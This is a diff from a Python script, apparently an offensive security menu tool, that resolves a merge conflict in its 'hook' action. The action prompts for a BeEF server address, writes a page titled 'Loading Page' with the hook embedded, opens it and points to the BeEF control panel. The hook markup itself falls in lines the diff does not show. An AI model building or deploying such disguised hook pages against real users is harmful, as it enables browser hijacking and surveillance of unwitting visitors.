@@ -388,7 +388,6 @@ while True:
 
 #Action hook = beef hook
 	#Action hook = beef hook
-<<<<<<< HEAD
     if action == "hook":
         logging.info(f"Chosen action hook to attempt beef hook")
         pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
@@ -402,21 +401,6 @@ while True:
 				
 				# Create HTML page with the hook embedded
                 html_content = f"""<!DOCTYPE html>
-=======
-	if action == "hook":
-		logging.info(f"Chosen action hook to attempt beef hook")
-		pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
-		sleep(0.1)
-		while True:
-			beefip = input("IP that beef is running on (pure IP number with port - native port 3000): ")
-			if re.match(pattern, beefip):
-				cls()
-				print("Valid IP, creating hook page...")
-				sleep(0.1)
-				
-				# Create HTML page with the hook embedded
-				html_content = f"""<!DOCTYPE html>
->>>>>>> e274f7ed85195a30302fddd7fe63a6b825bff722
 <html>
 <head>
 	<title>Loading Page</title>
@@ -434,7 +418,6 @@ while True:
 </html>"""
 				
 				# Save to temporary file
-<<<<<<< HEAD
                 with open("beef_hook.html", "w") as f:
                     f.write(html_content)
 				
@@ -452,24 +435,6 @@ while True:
                 print("Invalid IP input")
                 logging.error(f"Invalid IP input for beef hook: {beefip}")
                 sleep(0.1)
-=======
-				with open("beef_hook.html", "w") as f:
-					f.write(html_content)
-				
-				# Get absolute path and open in browser
-				hook_path = os.path.abspath("beef_hook.html")
-				webbrowser.open(f"file://{hook_path}")
-				
-				print("Hook page opened in browser...")
-				print(f"Check BeEF panel at: http://{beefip}/ui/panel")
-				logging.info(f"Created beef hook page for {beefip}")
-				sleep(1)
-				break
-			else:
-				print("Invalid IP input")
-				logging.error(f"Invalid IP input for beef hook: {beefip}")
-				sleep(0.1)
->>>>>>> e274f7ed85195a30302fddd7fe63a6b825bff722
 
 #
 #
